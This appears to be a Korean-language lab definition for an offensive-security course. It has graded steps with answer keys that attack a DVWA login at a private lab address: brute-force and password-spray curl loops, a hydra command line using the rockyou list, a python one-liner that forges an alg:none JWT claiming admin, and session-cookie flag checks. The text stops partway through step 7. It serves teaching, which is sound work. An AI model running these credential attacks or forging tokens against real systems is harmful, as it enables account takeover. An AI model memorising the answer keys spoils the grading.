lab_id: standalone-attack-adv-week05
title: "인증·세션 공격 — 자격증명·토큰·세션을 뚫는다"
version: standalone-attack-adv
course: attack-adv
week: 5
description: |
  공격 고급 W05 — 인증·세션 공격. 신원 통제(인증)를 직접 노린다. 자격증명 공격(브루트포스·패스워드 스프레이·
  스터핑), JWT 토큰 위조(alg:none·약한 시크릿), 세션 관리 결함(고정·예측). el34-attacker(hydra·python3)에서
  인가 표적(el34-web 로그인)에. ⚠️ 인가된 실습만. 외부 시스템 금지.
difficulty: hard
duration_minutes: 180
prerequisites:
  - "attack-adv W01~W04 + 웹 인증 기초"
  - "el34 호스트 SSH + docker exec, el34-attacker"
  - "lecture §2(자격 공격) §3(JWT) §4(세션) 숙지"
objectives:
  - "자격증명 공격(브루트포스·스프레이·스터핑) 분류·실행"
  - "JWT 구조와 alg:none·약한 시크릿 위조 이해"
  - "세션 결함(고정·예측)과 인증 방어(MFA·잠금) 이해"
pass_threshold: 0.7
steps:

  - order: 1
    instruction: |
      ## 🎯 인증 표적·도구 확인
      **실습 의미:** 인증은 모든 접근통제의 관문이다 — 자격 공격 도구(hydra)·토큰 도구(python3)와 세션 쿠키를 발급하는 로그인 표적을 확인한다. **⚠️ 인가된 el34 표적에만.**
      ## 💻 실행 명령 (한 줄씩 따라 실행)
      ```bash
      docker exec el34-attacker sh -c '
        # 자격 공격 도구(hydra)+토큰 도구(python3) 존재 확인
        command -v hydra python3 >/dev/null 2>&1 && echo tools_ok
        # 로그인 표적이 세션 쿠키(set-cookie)를 발급하는지 확인
        curl -s -i -H "Host: dvwa.el34.lab" http://10.20.30.1/login.php 2>/dev/null | grep -ic "set-cookie"
        # 도구가 갖춰졌으면 인증 표적 준비 마커
        command -v hydra python3 >/dev/null 2>&1 && echo auth_ready
      '
      ```
      ## ✅ 합격 기준
      `auth_ready`(과 tools_ok·쿠키 수)가 출력되면 통과. **근거:** 마커는 hydra·python3가 실제 존재할 때만 찍히므로, 인증을 직접 노릴 도구와 로그인 표적이 확인됐음을 뜻한다.
    hint: '인증 표적'
    category: survey
    points: 10
    answer: |
      docker exec el34-attacker sh -c '
        # 도구(hydra/python3) 확인
        command -v hydra python3 >/dev/null 2>&1 && echo tools_ok
        # 로그인 표적 세션 쿠키 발급 확인
        curl -s -i -H "Host: dvwa.el34.lab" http://10.20.30.1/login.php 2>/dev/null | grep -ic "set-cookie"
        # 도구 갖춰졌으면 인증 표적 준비 마커
        command -v hydra python3 >/dev/null 2>&1 && echo auth_ready
      '
    answer_detail: "인증 표적 = 로그인 폼(세션 쿠키 발급)+hydra/python3. 인증은 모든 접근통제의 관문."
    verify:
      type: output_contains
      expect: 'auth_ready'
      field: stdout
      semantic: {intent: "인증 표적", success_criteria: ["도구/로그인"], acceptable_methods: ["**[OSS] hydra (권장)**"]}
    target_vm: web

  - order: 2
    instruction: |
      ## 🎯 자격증명 공격 분류 — 브루트 vs 스프레이
      **실습 의미:** 자격 공격의 두 축을 직접 실행해 차이를 체득한다 — 브루트포스(한 계정·여러 비번, 잠금 위험)와 스프레이(여러 계정·한 비번, 잠금 회피).
      ## 💻 실행 명령 (한 줄씩 따라 실행)
      ```bash
      docker exec el34-attacker sh -c '
        # [브루트포스] 한 계정(admin)에 여러 비번을 시도한다 (계정 집중 → 잠금 위험)
        echo "[브루트포스] admin에 여러 비번:"
        B=0; for p in admin password 123456; do curl -s -o /dev/null -H "Host: dvwa.el34.lab" --data "username=admin&password=$p&Login=Login" http://10.20.30.1/login.php; B=$((B+1)); done; echo "  ${B}회"
        # [스프레이] 여러 계정에 흔한 비번 1개를 시도한다 (계정당 1회 → 잠금 회피)
        echo "[스프레이] 여러 계정에 흔한 비번 1개:"
        S=0; for u in admin user1 test; do curl -s -o /dev/null -H "Host: dvwa.el34.lab" --data "username=$u&password=Password1&Login=Login" http://10.20.30.1/login.php; S=$((S+1)); done; echo "  ${S}회"
        # 두 공격을 모두 실제 수행했으면 분류 체득 마커
        [ "$B" -ge 3 ] && [ "$S" -ge 3 ] && echo cred_classified
      '
      ```
      ## ✅ 합격 기준
      `cred_classified`(과 횟수)가 출력되면 통과. **근거:** 마커는 브루트포스·스프레이를 각각 3회 이상 실제 수행했을 때만 찍히므로, 두 자격 공격의 차이를 실연으로 체득했음을 뜻한다.
    hint: '자격 공격 분류'
    category: manipulation
    points: 12
    answer: |
      docker exec el34-attacker sh -c '
        # [브루트포스] admin에 여러 비번
        echo "[브루트포스] admin에 여러 비번:"
        B=0; for p in admin password 123456; do curl -s -o /dev/null -H "Host: dvwa.el34.lab" --data "username=admin&password=$p&Login=Login" http://10.20.30.1/login.php; B=$((B+1)); done; echo "  ${B}회"
        # [스프레이] 여러 계정에 흔한 비번 1개
        echo "[스프레이] 여러 계정에 흔한 비번 1개:"
        S=0; for u in admin user1 test; do curl -s -o /dev/null -H "Host: dvwa.el34.lab" --data "username=$u&password=Password1&Login=Login" http://10.20.30.1/login.php; S=$((S+1)); done; echo "  ${S}회"
        # 둘 다 수행했으면 분류 마커
        [ "$B" -ge 3 ] && [ "$S" -ge 3 ] && echo cred_classified
      '
    answer_detail: "자격 분류 = 브루트포스·스프레이를 실제 curl로 수행(횟수 게이트). 가짜 echo 아닌 실연. 스프레이가 탐지 회피적."
    verify:
      type: output_contains
      expect: 'cred_classified'
      field: stdout
      semantic: {intent: "자격 공격 분류", success_criteria: ["브루트/스프레이"], acceptable_methods: ["**[설명] 분류 (권장)**"]}
    target_vm: web

  - order: 3
    instruction: |
      ## 🎯 패스워드 스프레이 실행
      **실습 의미:** 흔한 비밀번호 몇 개를 계정에 시도하고, 응답 코드·길이 차이(differential)로 성공을 판별한다 — 균일하면 실패다.
      ## 💻 실행 명령 (한 줄씩 따라 실행)
      ```bash
      docker exec el34-attacker sh -c '
        # 패스워드 스프레이: 흔한 비번 여러 개를 admin에 시도해 응답코드 차이로 성공 판별
        for p in admin password 123456 letmein; do
          code=$(curl -s -o /dev/null -w "%{http_code}" -H "Host: dvwa.el34.lab" --data "username=admin&password=$p&Login=Login" http://10.20.30.1/login.php)
          echo "admin:$p=$code"
        done
        # 스프레이를 실행했으면 마커
        echo spray_done
      '
      ```
      ## ✅ 합격 기준
      `spray_done`(과 비번별 코드)이 출력되면 통과. **근거:** 각 비번 시도의 응답코드가 실제 출력됐다는 건 스프레이를 수행해 성공 판별의 differential을 관찰했다는 뜻이다.
    hint: '스프레이'
    category: analysis
    points: 14
    answer: |
      docker exec el34-attacker sh -c '
        # 흔한 비번 스프레이 → 응답코드 차이 관찰
        for p in admin password 123456 letmein; do
          code=$(curl -s -o /dev/null -w "%{http_code}" -H "Host: dvwa.el34.lab" --data "username=admin&password=$p&Login=Login" http://10.20.30.1/login.php)
          echo "admin:$p=$code"
        done
        # 스프레이 실행 마커
        echo spray_done
      '
    answer_detail: "스프레이 실행 = 흔한 비번을 계정에 시도. 성공은 differential(응답 차이)로 판별. 잠금 회피적 기법."
    verify:
      type: output_contains
      expect: 'spray_done'
      field: stdout
      semantic: {intent: "스프레이", success_criteria: ["자격 시도"], acceptable_methods: ["**[OSS] curl/hydra (권장)**"]}
    target_vm: web

  - order: 4
    instruction: |
      ## 🎯 hydra 자동화
      **실습 의미:** hydra는 자격 공격을 자동화한다 — 프로토콜·폼·실패 조건(F=실패문자열)을 정확히 줘야 성공을 판별한다. 도구가 실제 동작하는지 확인한다.
      ## 💻 실행 명령 (한 줄씩 따라 실행)
      ```bash
      docker exec el34-attacker sh -c '
        # hydra 자동화 구문(참고): -l 사용자 -P 비번목록 + http-post-form + F=실패문자열
        echo "예: hydra -l admin -P rockyou.txt 10.20.30.1 http-post-form \"/login.php:username=^USER^&password=^PASS^&Login=Login:F=incorrect\""
        # hydra가 실제 설치돼 동작하는지 버전 라인 확인
        hydra -h 2>&1 | head -1
        # hydra가 가용하면 자동화 마커
        command -v hydra >/dev/null 2>&1 && echo hydra_done
      '
      ```
      ## ✅ 합격 기준
      `hydra_done`(과 버전 라인)이 출력되면 통과. **근거:** 마커는 hydra가 실제 설치돼 가용할 때만 찍히므로, 자격 공격을 자동화할 도구가 동작함을 뜻한다.
    hint: 'hydra'
    category: analysis
    points: 12
    answer: |
      docker exec el34-attacker sh -c '
        # hydra 자동화 구문 참고
        echo "예: hydra -l admin -P rockyou.txt 10.20.30.1 http-post-form \"/login.php:username=^USER^&password=^PASS^&Login=Login:F=incorrect\""
        # hydra 버전 라인 확인
        hydra -h 2>&1 | head -1
        # hydra 가용 시 마커
        command -v hydra >/dev/null 2>&1 && echo hydra_done
      '
    answer_detail: "hydra = 자격 공격 자동화(프로토콜·폼·실패조건). 대량 시도. 정확한 실패 판별이 핵심."
    verify:
      type: output_contains
      expect: 'hydra_done'
      field: stdout
      semantic: {intent: "hydra", success_criteria: ["자동화 구문"], acceptable_methods: ["**[OSS] hydra (권장)**"]}
    target_vm: web

  - order: 5
    instruction: |
      ## 🎯 JWT 토큰 공격 (alg:none 위조)
      **실습 의미:** JWT는 서명으로 무결성을 보장하는데, alg:none을 받아주면 서명 없이 토큰을 위조할 수 있다 — role:admin 위조 토큰을 직접 생성해 본다(서버가 수락 시 인증 우회).
      ## 💻 실행 명령 (한 줄씩 따라 실행)
      ```bash
      # 1) alg:none 위조 JWT(role:admin, 서명 없음)를 python3로 생성한다 (python 코드에 작은따옴표가 있어 docker exec는 큰따옴표)
      FORGED=$(docker exec el34-attacker sh -c "python3 -c \"import base64,json; b=lambda d: base64.urlsafe_b64encode(d).decode().rstrip('='); h=b(json.dumps({'alg':'none','typ':'JWT'}).encode()); p=b(json.dumps({'user':'admin','role':'admin'}).encode()); print(h+'.'+p+'.')\"")
      echo "forged JWT: $FORGED"
      # 2) 위조 토큰이 실제 생성됐으면 마커
      [ -n "$FORGED" ] && echo jwt_done
      ```
      ## ✅ 합격 기준
      `jwt_done`(과 위조 토큰)이 출력되면 통과. **근거:** 마커는 alg:none 위조 JWT가 실제 생성됐을 때만 찍히므로, 서명 없는 토큰 위조(서버가 alg:none 수락 시 인증 우회)를 실증했음을 뜻한다.
    hint: 'JWT'
    category: analysis
    points: 14
    answer: |
      # 1) alg:none 위조 JWT(role:admin) 생성 (python 작은따옴표 → docker exec 큰따옴표)
      FORGED=$(docker exec el34-attacker sh -c "python3 -c \"import base64,json; b=lambda d: base64.urlsafe_b64encode(d).decode().rstrip('='); h=b(json.dumps({'alg':'none','typ':'JWT'}).encode()); p=b(json.dumps({'user':'admin','role':'admin'}).encode()); print(h+'.'+p+'.')\"")
      echo "forged JWT: $FORGED"
      # 2) 위조 토큰 생성됐으면 마커
      [ -n "$FORGED" ] && echo jwt_done
    answer_detail: "JWT 공격 = alg:none(서명 비검증)으로 role:admin 위조. 약한 시크릿 크랙. 방어는 alg 고정·강한 시크릿."
    verify:
      type: output_contains
      expect: 'jwt_done'
      field: stdout
      semantic: {intent: "JWT", success_criteria: ["alg:none 위조"], acceptable_methods: ["**[OSS] python3 JWT (권장)**"]}
    target_vm: web

  - order: 6
    instruction: |
      ## 🎯 세션 관리 결함
      **실습 의미:** 세션은 인증 후의 '신원 증표'다 — 약하면 인증을 통째로 우회한다. 로그인 페이지가 발급하는 세션 토큰을 관찰하고 결함 유형을 정리한다.
      ## 💻 실행 명령 (한 줄씩 따라 실행)
      ```bash
      docker exec el34-attacker sh -c '
        # 세션 토큰 관찰: 로그인 페이지가 발급하는 PHPSESSID 등 set-cookie를 본다
        curl -s -i -H "Host: dvwa.el34.lab" http://10.20.30.1/login.php 2>/dev/null | grep -i "set-cookie" | head -2
        echo "결함 유형: 세션 고정(미재발급)·예측 가능 토큰·미만료·HttpOnly/Secure 부재"
        # 세션 토큰을 실제 관찰했으면(set-cookie 존재) 마커
        curl -s -i -H "Host: dvwa.el34.lab" http://10.20.30.1/login.php 2>/dev/null | grep -qi "set-cookie" && echo session_done
      '
      ```
      ## ✅ 합격 기준
      `session_done`(과 세션 쿠키)이 출력되면 통과. **근거:** 마커는 로그인 표적이 세션 토큰(set-cookie)을 실제 발급할 때만 찍히므로, 세션 증표를 관찰하고 결함 유형을 점검할 대상을 확보했음을 뜻한다.
    hint: '세션 결함'
    category: report
    points: 12
    answer: |
      docker exec el34-attacker sh -c '
        # 세션 토큰(set-cookie) 관찰
        curl -s -i -H "Host: dvwa.el34.lab" http://10.20.30.1/login.php 2>/dev/null | grep -i "set-cookie" | head -2
        echo "결함 유형: 세션 고정(미재발급)·예측 가능 토큰·미만료·HttpOnly/Secure 부재"
        # set-cookie 존재 시 마커
        curl -s -i -H "Host: dvwa.el34.lab" http://10.20.30.1/login.php 2>/dev/null | grep -qi "set-cookie" && echo session_done
      '
    answer_detail: "세션 결함 = 고정/예측가능/미만료/플래그부재. 인증 후 신원 증표가 약하면 인증 우회. 재발급·강한 난수 필요."
    verify:
      type: output_contains
      expect: 'session_done'
      field: stdout
      semantic: {intent: "세션 결함", success_criteria: ["고정/예측"], acceptable_methods: ["**[OSS] 세션 분석 (권장)**"]}
    target_vm: web

  - order: 7
    instruction: |
      ## 🎯 방어 — 세션 쿠키 보안 플래그 점검
      **실습 의미:** 세션 방어는 HttpOnly(JS 접근 차단)·Secure(HTTPS)·SameSite다 — 실제 세션 쿠키를 받아 보안 플래그를 점검한다(자격 공격 1위 방어는 MFA).
      ## 💻 실행 명령 (한 줄씩 따라 실행)
      ```bash
      docker exec el34-attacker sh -c '
        # 실제 세션 쿠키를 받아 보안 플래그를 점검한다
        CK=$(curl -sI -H "Host: dvwa.el34.lab" http://10.20.30.1/login.php 2>/dev/null | grep -i "set-cookie")
        echo "세션 쿠키: $CK"
        # HttpOnly 플래그 유무 점검 (XSS 세션탈취 방어)
        echo "$CK" | grep -qi "HttpOnly" && echo "HttpOnly 설정됨(XSS 세션탈취 방어)" || echo "HttpOnly 누락=세션 탈취 위험(갭)"
        # 세션 쿠키를 실제 받아 점검했으면 방어 점검 마커
        [ -n "$CK" ] && echo defense_done
      '
      ```
      ## ✅ 합격 기준
